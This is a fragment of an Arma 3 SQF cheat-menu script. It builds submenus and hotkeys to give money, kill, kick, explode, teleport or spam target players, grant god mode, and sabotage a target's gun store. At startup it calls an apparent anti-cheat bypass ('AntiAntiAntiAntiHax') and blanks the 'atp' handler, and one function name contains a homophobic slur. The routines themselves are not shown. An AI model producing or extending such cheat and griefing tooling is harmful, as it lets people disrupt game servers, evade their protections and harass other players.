		LeHax = LeHax + ["Spiderman","[] spawn Wookie_Spiderman_VF","0","0","0","0",[]];
		LeHax = LeHax + ["==== Fun Scripts ====","","0","1","0","0",[]];
		LeHax = LeHax + ["Bluefor Heli Squad","[] spawn Wookie_HeliSquad","0","0","0","0",[]];
		LeHax = LeHax + ["Opfor Heli Squad","[] spawn Wookie_HeliSquad2","0","0","0","0",[]];
		LeHax = LeHax + ["News Banner","[] spawn Wookie_NewsBanner","1","0","0","0",[]];
		LeHax = LeHax + ["3D Text","[] spawn Wookie_3Dtext","1","0","0","0",[]];
		LeHax = LeHax + ["Vehicle Speed","[] spawn Wookie_SpeedyGonzales","1","0","0","0",[]];
		LeHax = LeHax + ["Auto Take Off AH9","[] spawn Wookie_AutoTakeOffV2","0","0","0","0",[]];
		LeHax = LeHax + ["Missile Strike","[] spawn Wookie_MissileStrike","0","0","0","0",[]];
		LeHax = LeHax + ["Minimize Time Between Shots","[] spawn Wookie_QuickFire","1","0","0","0",[]];
		LeHax = LeHax + ["Explosive Shots","[] spawn Wookie_BigFcknBullets","1","0","0","0",[]];

		for [{_num = 0}, {_num <= count(LeHax)-1}, {_num = _num+7}] do
		{
			_index      = _ctrl lbAdd format["%1", LeHax select _num];
			_togglable  = LeHax select (_num+2);
			_istitle    = LeHax select (_num+3);
			_issubmenu  = LeHax select (_num+4);
			_thcolor    = LeHax select (_num+6);
			
			if (count _thcolor == 0) then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_run];
			}
			else
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, _thcolor];
			};
		
			if (_togglable == "1") then
			{
				if (_index in WookieMenu_hax_toggled) then
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "toggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_on];
				}
				else
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "nottoggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_off];
				};
			};

			if (_istitle == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_title];
			};

			if (_issubmenu == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_sub];
			};
		};
	};

	WookieMenu_fill_wasteland =
	{	
		isInSub = false;
	
		_ctrl = 2 call WookieMenu_getControl;
		lbclear _ctrl;
	
		LeHax = [];
	
		LeHax = LeHax + ["----------------------    Main Menu","Main_Menu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Fun Menu","Funmenu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Wasteland Menu","Wasteland","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target Player Scripts","Target","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target All Players Scripts","All","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Vehicle","Vehicles","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Object","Objects","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Weapon","Weaponz","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    DayZ/Zoombies","DayZ","0","0","1","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["==========================================================================================================","","0","1","0","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["==== Wasteland  ====","","0","1","0","0",[]];
		LeHax = LeHax + ["404 Wasteland Admin Menu","[] spawn Wookie_AdminMenu_404","0","0","0","0",[]];
		LeHax = LeHax + ["==== Cash  ====","","0","1","0","0",[]];
		LeHax = LeHax + ["100$","[100] spawn Wookie_Cash","0","0","0","0",[]];
		LeHax = LeHax + ["1000$","[1000] spawn Wookie_Cash","0","0","0","0",[]];
		LeHax = LeHax + ["2000$","[2000] spawn Wookie_Cash","0","0","0","0",[]];
		LeHax = LeHax + ["3000$","[3000] spawn Wookie_Cash","0","0","0","0",[]];
		LeHax = LeHax + ["4000$","[4000] spawn Wookie_Cash","0","0","0","0",[]];
		LeHax = LeHax + ["5000$","[5000] spawn Wookie_Cash","0","0","0","0",[]];
		LeHax = LeHax + ["MAXIMUM","[5000000] spawn Wookie_Cash","0","0","0","0",[]];
	
		LeHax = LeHax + ["==== Cash Target  ====","","0","1","0","0",[]];
		LeHax = LeHax + ["1000$","spawn Wookie_Cash_1k_t","0","0","0","1",[]];
		LeHax = LeHax + ["3000$","spawn Wookie_Cash_3k_t","0","0","0","1",[]];
		LeHax = LeHax + ["MAXIMUM","spawn Wookie_Cash_max_t","0","0","0","1",[]];

		LeHax = LeHax + ["==== Cash All  ====","","0","1","0","0",[]];
		LeHax = LeHax + ["1000$","[1000] spawn Wookie_Cash_a","0","0","0","0",[]];
		LeHax = LeHax + ["3000$","[1000] spawn Wookie_Cash_a","0","0","0","0",[]];
		LeHax = LeHax + ["MAXIMUM","[1000] spawn Wookie_Cash_a","0","0","0","0",[]];

		for [{_num = 0}, {_num <= count(LeHax)-1}, {_num = _num+7}] do
		{
			_index      = _ctrl lbAdd format["%1", LeHax select _num];
			_togglable  = LeHax select (_num+2);
			_istitle    = LeHax select (_num+3);
			_issubmenu  = LeHax select (_num+4);
			_thcolor    = LeHax select (_num+6);
		
			if (count _thcolor == 0) then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_run];
			}
			else
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, _thcolor];
			};
		
			if (_togglable == "1") then
			{
				if (_index in WookieMenu_hax_toggled) then
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "toggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_on];
				}
				else
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "nottoggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_off];
				};
			};

			if (_istitle == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_title];
			};

			if (_issubmenu == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_sub];
			};
		};
	};

	WookieMenu_fill_Target =
	{
		isInSub = false;

		_ctrl = 2 call WookieMenu_getControl;
		lbclear _ctrl;

		LeHax = [];

		LeHax = LeHax + ["----------------------    Main Menu","Main_Menu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Fun Menu","Funmenu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Wasteland Menu","Wasteland","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target Player Scripts","Target","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target All Players Scripts","All","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Vehicle","Vehicles","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Object","Objects","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Weapon","Weaponz","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    DayZ/Zoombies","DayZ","0","0","1","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["==========================================================================================================","","0","1","0","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["==== Target ====","","0","1","0","0",[]];
		LeHax = LeHax + ["Add Target To Whitelist","spawn Wookie_Add_To_Green","0","0","0","1",[]];
		LeHax = LeHax + ["Fuck Up Targets Gun Store","spawn Wookie_FuckUp_GunStore","0","0","0","1",[]];
		LeHax = LeHax + ["Spam Target","spawn Wookie_Spam_Faggots","0","0","0","1",[]];
		LeHax = LeHax + ["Heal Target","spawn Wookie_heal_t","0","0","0","1",[]];
		LeHax = LeHax + ["Fuck Up","spawn Wookie_FuckUp_t","0","0","0","1",[]];
		LeHax = LeHax + ["Kick","spawn Wookie_Kick_t","0","0","0","1",[]];
		LeHax = LeHax + ["Spin Around","spawn Wookie_SpinAround_t","0","0","0","1",[]];
		LeHax = LeHax + ["Explode Target","spawn Wookie_Explode_t","0","0","0","1",[]];
		LeHax = LeHax + ["Kill","spawn Wookie_Kill_t","0","0","0","1",[]];
		LeHax = LeHax + ["Teleport To Target","spawn Wookie_TpToMe_t","0","0","0","1",[]];
		LeHax = LeHax + ["Teleport Target To You","spawn Wookie_TpToThem_t","0","0","0","1",[]];
		LeHax = LeHax + ["Spectate","spawn Wookie_Spectate_t","0","0","0","1",[]];
		LeHax = LeHax + ["God","spawn Wookie_GodMode_t","0","0","0","1",[]];
		LeHax = LeHax + ["Join Target's Vehicle","spawn Wookie_JoinVeh_t","0","0","0","1",[]];
		LeHax = LeHax + ["==== Visual Filter ====","","0","1","0","0",[]];
		LeHax = LeHax + ["Remove Visual Filter","spawn Wookie_Remove_VF_t","0","0","0","1",[]];
		LeHax = LeHax + ["Wasteland Filter","spawn Wookie_Wasteland_VF_t","0","0","0","1",[]];
		LeHax = LeHax + ["Black/White Thermal","spawn Wookie_BlackNWhite_VF_t","0","0","0","1",[]];
		LeHax = LeHax + ["Spiderman","spawn Wookie_Spiderman_VF_t","0","0","0","1",[]];
		LeHax = LeHax + ["Gloomy","spawn Wookie_Gloomy_VF_t","0","0","0","1",[]];

		for [{_num = 0}, {_num <= count(LeHax)-1}, {_num = _num+7}] do
		{
			_index      = _ctrl lbAdd format["%1", LeHax select _num];
			_togglable  = LeHax select (_num+2);
			_istitle    = LeHax select (_num+3);
			_issubmenu  = LeHax select (_num+4);
			_thcolor    = LeHax select (_num+6);
		
			if (count _thcolor == 0) then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_run];
			}
			else
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, _thcolor];
			};
		
			if (_togglable == "1") then
			{
				if (_index in WookieMenu_hax_toggled) then
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "toggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_on];
				}

				else
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "nottoggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_off];
				};
			};

			if (_istitle == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_title];
			};

			if (_issubmenu == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_sub];
			};
		};
	};

	WookieMenu_fill_All =
	{
		isInSub = false;
	
		_ctrl = 2 call WookieMenu_getControl;
		lbclear _ctrl;

		LeHax = [];
	
		LeHax = LeHax + ["----------------------    Main Menu","Main_Menu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Fun Menu","Funmenu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Wasteland Menu","Wasteland","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target Player Scripts","Target","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target All Players Scripts","All","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Vehicle","Vehicles","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Object","Objects","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Weapon","Weaponz","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    DayZ/Zoombies","DayZ","0","0","1","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["==========================================================================================================","","0","1","0","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["==== All ====","","0","1","0","0",[]];
		LeHax = LeHax + ["Random Para Drop Others","[] spawn Wookie_RandParaLol_a","0","0","0","0",[]];
		LeHax = LeHax + ["Random Teleport","[] spawn Wookie_RandTPLol_a","0","0","0","0",[]];
		LeHax = LeHax + ["Teleport","[] spawn Wookie_TPAll_a","0","0","0","0",[]];
		LeHax = LeHax + ["All God On","[] spawn Wookie_GodeMode_a","0","0","0","0",[]];
		LeHax = LeHax + ["All God Off","[] spawn Wookie_GodeModeOff_a","0","0","0","0",[]];
		LeHax = LeHax + ["==== Visual Filter ====","","0","1","0","0",[]];
		LeHax = LeHax + ["Remove Visual Filter","[] spawn Wookie_Remove_VF_a","0","0","0","0",[]];
		LeHax = LeHax + ["Wasteland Filter","[] spawn Wookie_Wasteland_VF_a","0","0","0","0",[]];
		LeHax = LeHax + ["Black/White Thermal","[] spawn Wookie_BlackNWhite_VF_a","0","0","0","0",[]];
		LeHax = LeHax + ["Spiderman","[] spawn Wookie_Spiderman_VF_a","0","0","0","0",[]];
		LeHax = LeHax + ["Gloomy","[] spawn Wookie_Gloomy_VF_a","0","0","0","0",[]];

		for [{_num = 0}, {_num <= count(LeHax)-1}, {_num = _num+7}] do
		{
			_index      = _ctrl lbAdd format["%1", LeHax select _num];
			_togglable  = LeHax select (_num+2);
			_istitle    = LeHax select (_num+3);
			_issubmenu  = LeHax select (_num+4);
			_thcolor    = LeHax select (_num+6);
		
			if (count _thcolor == 0) then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_run];
			}
			else
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, _thcolor];
			};
		
			if (_togglable == "1") then
			{
				if (_index in WookieMenu_hax_toggled) then
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "toggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_on];
				}
				else
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "nottoggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_off];
				};
			};

			if (_istitle == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_title];
			};

			if (_issubmenu == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_sub];
			};
		};
	};
	
	WookieMenu_fill_DayZ =
	{
		isInSub = false;

		_ctrl = 2 call WookieMenu_getControl;
		lbclear _ctrl;

		LeHax = [];

		LeHax = LeHax + ["----------------------    Main Menu","Main_Menu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Fun Menu","Funmenu","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Wasteland Menu","Wasteland","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target Player Scripts","Target","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Target All Players Scripts","All","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Vehicle","Vehicles","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Object","Objects","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    Weapon","Weaponz","0","0","1","0",[]];
		LeHax = LeHax + ["----------------------    DayZ/Zoombies","DayZ","0","0","1","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["==========================================================================================================","","0","1","0","0",[]];
		LeHax = LeHax + ["","","0","1","0","0",[]];
		LeHax = LeHax + ["==== DayZ/Zoombies Scripts====","","0","1","0","0",[]];
		LeHax = LeHax + ["Admin Base","[] spawn Wookie_Base","0","0","0","0",[]];
		LeHax = LeHax + ["High Light Zombies","[] spawn Wookie_ZombieColor","0","0","0","0",[]];
		LeHax = LeHax + ["Zombie Shield","[] spawn Wookie_ZedShield","0","0","0","0",[]];
		LeHax = LeHax + ["More Zoombies/DayZ Scripts will be added","","0","1","0","0",[]];
		LeHax = LeHax + ["==== DayZ/Zoombies Loadouts ====","","0","1","0","0",[]];
		LeHax = LeHax + ["AK47 Loadout","[] spawn Wookie_AK47_Loadout","0","0","0","0",[]];
		LeHax = LeHax + ["Bomber Loadout","[] spawn Wookie_Bomber_Loadout","0","0","0","0",[]];
		LeHax = LeHax + ["CZ550 Loadout","[] spawn Wookie_CZ550_Loadout","0","0","0","0",[]];
		LeHax = LeHax + ["DMR Loadout","[] spawn Wookie_DMR_Loadout","0","0","0","0",[]];
		LeHax = LeHax + ["G36C Loadout","[] spawn Wookie_G36C_Loadout","0","0","0","0",[]];
		LeHax = LeHax + ["M4A1 Holo Loadout","[] spawn Wookie_M4A1HOLO_Loadout","0","0","0","0",[]];
		LeHax = LeHax + ["M16 Acog Loadout","[] spawn Wookie_M16ACOG_Loadout","0","0","0","0",[]];
		LeHax = LeHax + ["M24 Loadout","[] spawn Wookie_M24_Loadout","0","0","0","0",[]];
		LeHax = LeHax + ["M249 Saw Loadout","[] spawn Wookie_M249_Loadout","0","0","0","0",[]];
		for [{_num = 0}, {_num <= count(LeHax)-1}, {_num = _num+7}] do
		{
			_index      = _ctrl lbAdd format["%1", LeHax select _num];
			_togglable  = LeHax select (_num+2);
			_istitle    = LeHax select (_num+3);
			_issubmenu  = LeHax select (_num+4);
			_thcolor    = LeHax select (_num+6);
		
			if (count _thcolor == 0) then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_run];
			}
			else
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, _thcolor];
			};
		
			if (_togglable == "1") then
			{
				if (_index in WookieMenu_hax_toggled) then
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "toggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_on];
				}

				else
				{
					_ctrl lbSetData [(lbsize _ctrl)-1, "nottoggled"];
					_ctrl lbSetColor [(lbsize _ctrl)-1, menu_toggle_off];
				};
			};

			if (_istitle == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_title];
			};

			if (_issubmenu == "1") then
			{
				_ctrl lbSetColor [(lbsize _ctrl)-1, menu_sub];
			};
		};
	};

	// Runs when the menu is displayed
	WookieMenu_initMenu =
	{
		// Fixing the menu
		_ctrl = -1 call WookieMenu_getControl;
		_ctrl ctrlSetPosition [safezoneX + 0.75, safezoneY + 0.1, 1.4965, safezoneH - 0.076];
		_ctrl ctrlCommit 0.01;

		_ctrl = 3 call WookieMenu_getControl;
		_ctrl ctrlSetPosition [safezoneX, safezoneY, 1, 0.02];
		_ctrl ctrlSetText "                                                       ARMA 3 SCRIPT MENU";
		_ctrl ctrlSetTextColor title_dialog;
		_ctrl ctrlSetBackgroundColor [0, 0, 0, 1];
		_ctrl ctrlSetFont font;
		_ctrl ctrlSetScale safezoneW;
		_ctrl ctrlCommit 0.01;

		// Fixing the MainTree / players
		_ctrl = 1 call WookieMenu_getControl;
		_ctrl ctrlSetPosition [safezoneX + 1.565, safezoneY + 0.1, 0.815, safezoneH - 0.03];
		_ctrl ctrlSetFont font;
		_ctrl ctrlSetFontHeight 0.03;
		//_ctrl ctrlSetScale (safezoneH - safezoneW / 2) * 1.5;
		_ctrl ctrlCommit 0.01;

		// Fixing the MainList / hacks
		_ctrl = 2 call WookieMenu_getControl;
		_ctrl ctrlSetPosition [safezoneX + 0.75, safezoneY + 0.1, 0.815, safezoneH - 0.03];
		_ctrl ctrlSetFont font;
		_ctrl ctrlSetFontHeight 0.03;
		//_ctrl ctrlSetScale 1.5;
		_ctrl ctrlCommit 0.01;

		// Remap functions
		_ctrl ctrlSetEventHandler ["LBDblClick", "call WookieMenu_hax_dbclick;"];
		_ctrl ctrlCommit 0.01;
		
		_ctrl ctrlSetEventHandler ["LBSelChanged", "call Wookie_Menu_Click_Hax;"];
		_ctrl ctrlCommit 0.001;

		call WookieMenu_fillHax;
		call WookieMenu_fillPlrs;
	};

	WookieMenu_getControl = {(findDisplay 3030) displayCtrl _this;};
};

if (isNil "MenuInitLol") then
{
	MenuInitLol = 0;
};
if (MenuInitLol == 0) then
{
	if (isnil "condition_admin_serveur") exitWith {hint "Erreur detection serveur !";};
	if (!(getPlayerUID player in sfp_config_liste_admin) && !condition_admin_serveur) exitWith {};
	MenuInitLol = 1;
	endLoadingScreen;
	disableSerialization;
	sleep 1;
	call AntiAntiAntiAntiHax;
	hint "Lancement SFP ...";
	sleep 1;

	if (!isnil "Wookie_Keybind") then
	{
		(findDisplay 46) displayRemoveEventHandler ["KeyUp", Wookie_Keybind];
	};

	Wookie_Keybinds =
	{
		switch (_this) do
		{
			case 15: //TAB
			{
				call Wookie_Init_Menu;
			};
			case 60: //F2
			{
				call Wookie_ForceAdminMenu_404;
			};
			case 61: //F3
			{
				call Wookie_Debug_Mon;
			};
			case 63: //F5
			{
				call Wookie_DeleteCursor;
			};
			case 64: //F6
			{
				call Wookie_KillCursor;
			};
			case 66: //F8
			{
				call Wookie_TPCursor;
			};
		};
	};

	waituntil {!isnull (finddisplay 46)};
	Wookie_Keybind = (findDisplay 46) displayAddEventHandler ["KeyUp", "_this select 1 call Wookie_Keybinds; false;"];
	
	sleep 1;
	if (!(isNil "Dayz_GUI_R") or !(isNil "dayz_originalPlayer")) then 
	{
		"atp" addPublicVariableEventHandler {};
	};
	sleep 1;
	
	waituntil {!alive player ; sleep 1;};
	MenuInitLol = 0;
}
else
{
};